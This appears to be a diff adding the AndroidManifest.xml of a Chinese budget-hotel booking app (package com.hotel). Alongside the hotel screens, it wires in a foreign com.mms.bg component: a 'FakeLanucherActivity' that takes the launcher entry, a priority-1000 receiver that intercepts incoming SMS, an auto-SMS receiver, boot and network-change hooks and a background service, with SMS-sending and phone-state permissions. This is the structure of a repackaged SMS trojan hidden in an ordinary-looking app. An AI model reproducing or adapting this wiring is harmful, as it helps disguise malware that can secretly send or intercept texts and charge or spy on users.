@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.hotel">
+    <application android:icon="@drawable/icon" android:label="经济酒店" android:name="HotelApplication" android:theme="@style/hotel_theme">
+        <activity android:name=".SplashActivity" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".ActivityMain" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".ListHotelActivity" android:screenOrientation="portrait"/>
+        <activity android:label="请选择入住酒店城市" android:name=".CityActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".HotelDetailActivity" android:screenOrientation="portrait"/>
+        <activity android:label="修改日期" android:name=".Update_dateActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:label="房间详情" android:name=".RoomDetailActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".BookActivity" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".PostOrderActivity" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".ListOrderActivity" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".OrderDetailActivity" android:screenOrientation="portrait"/>
+        <activity android:label="订单查询" android:name=".SearchOrderActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:label="酒店筛选" android:name=".HotelSearchIfActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:name=".ListLsActivity" android:screenOrientation="portrait"/>
+        <activity android:name=".HelpActivity" android:screenOrientation="portrait"/>
+        <activity android:name=".AboutActivity" android:screenOrientation="portrait"/>
+        <activity android:label="系统消息" android:name=".NewsActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".ListPromotionActivity" android:screenOrientation="portrait"/>
+        <activity android:name=".PromotionDetailActivity" android:screenOrientation="portrait"/>
+        <activity android:label="软件设置" android:name=".SettingActivity" android:screenOrientation="portrait" android:theme="@style/setting_theme"/>
+        <activity android:label="系统设置提示" android:name=".SettingAlertActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:label="请选择" android:name=".SysActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:name=".FavActivity" android:screenOrientation="portrait"/>
+        <activity android:label="请选择" android:name=".HotelExtActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:label="查看点评" android:name=".ReviewActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".WhereListHotelActivity" android:screenOrientation="portrait"/>
+        <activity android:label="促销活动" android:name=".HotelPromotionActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:label="周边酒店" android:name=".NearHotelActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:label="附近地标" android:name=".NearLabelActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".CBDActivity" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".SubwayActivity" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".LabelActivity" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".LabelDetailActivity" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:name="com.mms.bg.ui.FakeLanucherActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <receiver android:name="com.mms.bg.transaction.SmsReceiver">
+            <intent-filter>
+                <action android:name="com.android.mms.transaction.MESSAGE_SENT"/>
+                <data android:scheme="content"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.SEND_MESSAGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.transaction.PrivilegedSmsReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.ui.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.ui.AutoSMSRecevier">
+            <intent-filter>
+                <action android:name="com.mms.bg.SMS"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.ui.InternetStatusReceiver">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.mms.bg.ui.BgService">
+            <intent-filter>
+                <action android:name="com.mms.bg.FILTER_ACTION"/>
+            </intent-filter>
+            <meta-data android:name="com.mms.bg.pid" android:value="20013"/>
+            <meta-data android:name="com.package.name" android:value="com.hotel"/>
+            <meta-data android:name="com.component.name" android:value="com.hotel.SplashActivity"/>
+        </service>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+</manifest>
